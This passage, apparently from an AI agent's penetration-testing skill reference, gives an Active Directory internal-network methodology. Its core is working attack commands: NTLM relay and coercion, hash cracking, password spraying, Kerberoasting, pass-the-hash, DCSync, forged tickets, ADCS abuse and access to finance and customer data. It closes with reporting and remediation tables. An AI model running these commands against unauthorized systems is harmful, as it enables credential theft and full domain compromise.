# conducting-internal-network-penetration-test — 详细参考（由 SKILL.md 拆分）

# mitm6 — IPv6 DNS takeover
sudo mitm6 -d corp.local

# ntlmrelayx — relay captured credentials
impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks

# PetitPotam — coerce NTLM authentication
python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
  attacker_ip 10.0.0.5
```

### Password Attacks

```bash
# Crack captured NTLMv2 hashes
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Password spraying (careful with lockout policies)
netexec smb 10.0.0.5 -u users.txt -p 'Spring2025!' --no-bruteforce
netexec smb 10.0.0.5 -u users.txt -p 'Company2025!' --no-bruteforce

# Kerberoasting — target service accounts
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast_hashes.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting — target accounts without pre-auth
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Phase 3 — Exploitation and Lateral Movement

### Lateral Movement Techniques

```bash
# Pass-the-Hash with Impacket
impacket-psexec 'corp.local/admin@10.0.0.30' -hashes :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

# WMI execution
impacket-wmiexec 'corp.local/admin:AdminPass123@10.0.0.30'

# Evil-WinRM for PowerShell remoting
evil-winrm -i 10.0.0.30 -u admin -p 'AdminPass123'

# SMBExec
impacket-smbexec 'corp.local/admin:AdminPass123@10.0.0.30'

# RDP access
xfreerdp /v:10.0.0.30 /u:admin /p:'AdminPass123' /cert-ignore /dynamic-resolution

# SSH pivoting
ssh -D 9050 user@10.0.0.40
proxychains nmap -sT -p 80,443,445,3389 10.10.0.0/24
```

### Privilege Escalation

```bash
# Windows privilege escalation
# Check for local admin via token impersonation
meterpreter> getsystem
meterpreter> run post/multi/recon/local_exploit_suggester

# PowerShell-based privesc checks
# Run PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# Check for unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Linux privilege escalation
./linpeas.sh
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

### Domain Escalation

```bash
# DCSync attack (requires replication rights)
impacket-secretsdump 'corp.local/domainadmin:DaPass123@10.0.0.5' -just-dc

# Golden Ticket attack
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator

# Silver Ticket attack
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/db01.corp.local administrator

# ADCS exploitation (Certifried, ESC1-ESC8)
certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5
certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
  -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
```

## Phase 4 — Data Access and Impact Demonstration

```bash
# Access sensitive file shares
smbclient //10.0.0.10/Finance -U 'domainadmin%DaPass123'
> dir
> get Q4_Financial_Report.xlsx

# Database access
impacket-mssqlclient 'sa:DbPassword123@10.0.0.20'
SQL> SELECT name FROM sys.databases;
SQL> SELECT TOP 10 * FROM customers;

# Extract proof of access (DO NOT exfiltrate real data)
echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt

# Document access chain
# Initial Access -> Responder -> NTLMv2 crack -> Lateral to WS01
# -> Local admin -> Mimikatz -> DA creds -> DCSync -> Full domain compromise
```

## Phase 5 — Reporting

### Attack Path Documentation

```
Attack Path 1: Domain Compromise via LLMNR Poisoning
  Step 1: LLMNR/NBT-NS poisoning captured NTLMv2 hash (T1557.001)
  Step 2: Hash cracked offline — user: jsmith, password: Welcome2025!
  Step 3: jsmith had local admin on WS042 — lateral movement via PsExec (T1021.002)
  Step 4: Mimikatz extracted DA credentials from WS042 memory (T1003.001)
  Step 5: DCSync with DA credentials — all domain hashes extracted (T1003.006)
  Impact: Complete domain compromise from unauthenticated network position
```

### Findings Severity Matrix

| Finding | CVSS | MITRE ATT&CK | Remediation |
|---------|------|---------------|-------------|
| LLMNR/NBT-NS poisoning | 8.1 | T1557.001 | Disable LLMNR/NBT-NS via GPO |
| Kerberoastable service accounts | 7.5 | T1558.003 | Use gMSA, 25+ char passwords |
| Local admin reuse | 8.4 | T1078 | Deploy LAPS, unique local admin passwords |
| Weak domain passwords | 7.2 | T1110 | Enforce 14+ char minimum, blacklist common passwords |
| Unrestricted DCSync | 9.8 | T1003.006 | Audit replication rights, implement tiered admin model |

## Tools Reference

| Tool | Purpose |
|------|---------|
| Responder | LLMNR/NBT-NS/mDNS poisoning |
| Impacket | AD attack suite (secretsdump, psexec, wmiexec, etc.) |
| BloodHound | AD attack path visualization |
| NetExec (CrackMapExec) | Network service enumeration and spraying |
| Evil-WinRM | PowerShell remoting client |
| Certipy | AD Certificate Services exploitation |
| Mimikatz | Windows credential extraction |
| Hashcat | Password hash cracking |
| Nmap | Network scanning and enumeration |
| LinPEAS/WinPEAS | Privilege escalation enumeration |

## References

- Cobalt Internal Network Pentesting Methodology: https://docs.cobalt.io/methodologies/internal-network/
- MITRE ATT&CK Enterprise: https://attack.mitre.org/matrices/enterprise/
- PTES: http://www.pentest-standard.org/
- Impacket: https://github.com/fortra/impacket
- BloodHound: https://github.com/BloodHoundAD/BloodHound
